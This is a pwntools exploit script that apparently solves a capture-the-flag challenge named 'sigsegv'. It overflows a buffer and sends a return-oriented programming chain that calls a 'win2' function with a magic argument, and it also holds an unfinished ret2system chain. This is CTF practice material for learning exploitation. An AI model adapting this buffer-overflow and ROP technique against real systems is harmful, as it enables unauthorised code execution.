from pwn import *
import argparse 
from time import sleep

def main():
    args = parsing()

    if args.local:
        proc = process("sigsegv")
    else:
        proc = remote("nc.ctf.unitedctf.ca", 4000)
    if args.debug:
        gdb.attach(proc, """b *main+145
                            b *_init+22""")

    # print(proc.recv().strip().decode())
    print(proc.recvuntil(b"time:").strip().decode())
    
    rop = chain1() 

    print("--> Sending ROP chain:", rop)

    proc.sendline(rop)
    proc.interactive()


def chain2():
    # tentative de ret2plt ret2main ret2system
    puts = None
    main = None 
    ret = None

    rdi = None
    rsi_r15 = None
    
    rop = b""
    rop += b"A"*0x28 
    rop += p64(rdi)
    rop += p64(puts)
    rop += p64(puts)
    rop += p64(ret)*5

    rop = rop [:-1] # because last byte is NULL and gets automatically adds a NULL byte

    return rop


def chain1():
    win2 = 0x0000000000400b88
    rdi = 0x0000000000400c8b
    rsi_r15 = 0x0000000000400c89

    rop = b""
    rop += b"A"*0x28 
    rop += p64(rdi)
    rop += p64(0x1337133713371337) 
    rop += p64(rsi_r15)
    rop += b"\x00"*8
    rop += b"\x00"*8
    rop += p64(win2)

    return rop

def parsing():
    parser = argparse.ArgumentParser(description='Parse args')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true',
                    help='Active debug mode')
    parser.add_argument('-l', '--local', dest='local', action='store_true',
                    help='Start local process')
    return parser.parse_args()

if __name__ == "__main__":
    main()
